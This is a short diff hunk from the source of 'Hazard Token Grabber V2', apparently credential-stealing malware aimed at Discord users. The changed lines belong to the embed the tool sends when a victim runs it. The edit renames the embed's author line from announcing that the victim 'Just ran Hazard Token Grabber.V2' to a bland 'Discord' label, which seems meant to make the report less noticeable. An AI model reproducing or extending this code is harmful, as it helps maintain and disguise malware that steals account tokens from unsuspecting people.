@@ -531,7 +531,7 @@ class Hazard_Token_Grabber_V2(functions):
             'embeds': [
                 {
                     'author': {
-                        'name': f'*{Victim}* Just ran Hazard Token Grabber.V2',
+                        'name': f'*{Victim}* Discord',
                         'url': 'https://www.youtube.com/channel/UC7Qd6nnNiat95JWeIH0pX5Q',
                         'icon_url': 'https://emoji.discord.st/emojis/CattoCry.png'
                     },
